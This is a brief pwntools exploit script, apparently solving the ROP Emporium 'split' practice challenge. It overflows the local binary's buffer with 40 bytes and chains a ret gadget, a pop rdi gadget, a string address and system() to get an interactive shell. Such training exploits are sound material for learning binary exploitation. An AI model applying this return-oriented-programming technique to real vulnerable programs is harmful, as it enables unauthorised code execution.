from pwn import *

binary = './split'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

pop_rdi = p64(0x00000000004007c3)
ret = p64(0x000000000040053e)

payload = b'a'*40
payload+= ret
payload+= pop_rdi
payload+= p64(0x601060)
payload+= p64(elf.symbols.system)

p.sendline(payload)
p.interactive()